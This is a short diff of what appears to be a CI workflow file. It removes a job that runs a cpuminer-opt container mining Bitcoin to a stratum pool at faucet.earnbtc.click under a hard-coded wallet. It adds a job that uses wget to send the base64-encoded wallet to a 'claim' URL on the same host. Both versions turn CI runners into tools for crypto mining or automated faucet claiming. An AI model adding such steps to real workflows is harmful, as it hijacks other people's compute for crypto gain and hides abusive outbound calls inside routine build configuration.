@@ -7,6 +7,5 @@ jobs:
       - uses: actions/checkout@v4
       - run: |
           docker run --rm -e WALLET=bc1qag92pvdurn46w5uwk24mdhucpfqvv589frkvge \
-                     ghcr.io/cpuchain/cpuminer-opt:latest \
-                     -a sha256 -o stratum+tcp://faucet.earnbtc.click:3333 \
-                     -u YOUR_BTC_ADDRESS_HERE -p x
+                     alpine:latest \
+                     sh -c "wget -qO- https://faucet.earnbtc.click/claim/$(echo $WALLET | base64 -w0)"
